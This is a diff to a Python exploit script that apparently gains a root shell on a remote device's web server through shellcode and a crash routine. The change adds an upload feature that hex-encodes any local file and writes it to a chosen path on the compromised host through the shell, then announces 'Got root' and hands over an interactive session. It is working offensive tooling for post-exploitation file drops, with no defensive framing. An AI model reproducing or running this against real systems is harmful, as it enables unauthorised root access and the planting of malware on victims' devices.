@@ -88,6 +88,23 @@ def socketSend(s, data):
     print("Sent")
     time.sleep(0.5)
 
+def upload(tsock, ufiles, upaths):
+    fd = open(ufiles, 'rb')
+    ufile = ufiles.encode("ascii")
+    upath = upaths.encode("ascii")
+
+    print("Uploading " + ufiles + " in " + upaths + "...")
+
+    while True:
+        data = fd.read(1024)
+        if data:
+            hexdata = ''.join('\\\\x{:02x}'.format(c) for c in data).encode("ascii")
+            tsock.write(b"echo -e -n " + hexdata + b" >> " + upath + b"\n")
+        else:
+            break
+    print("Upload done!")
+    fd.close()
+
 def build_shellcode():
     shell_code = b''
 
@@ -250,7 +267,7 @@ def crash(ip, port):
     time.sleep(2.5) # www takes up to 3 seconds to restart
 
 if __name__ == "__main__":
-    if len(sys.argv) == 4:
+    if len(sys.argv) in (4, 6):
         ip       = sys.argv[1]
         port     = int(sys.argv[2])
         binary   = sys.argv[3]
@@ -272,7 +289,15 @@ if __name__ == "__main__":
         # reuse socket
         t = telnetlib.Telnet()
         t.sock = shell_sock
+        time.sleep(1)
+
+        if len(sys.argv) == 6:
+            upload_file = sys.argv[4]
+            upload_path = sys.argv[5]
+            upload(t, upload_file, upload_path)
+        
+        t.write(b"echo '\nGot root ;-)\n'\r\n")
         t.interact()
 
     else:
-        print("Usage: " + sys.argv[0] + " IP PORT binary")
+        print("Usage: " + sys.argv[0] + " IP PORT binary [upload_file dest_path]")
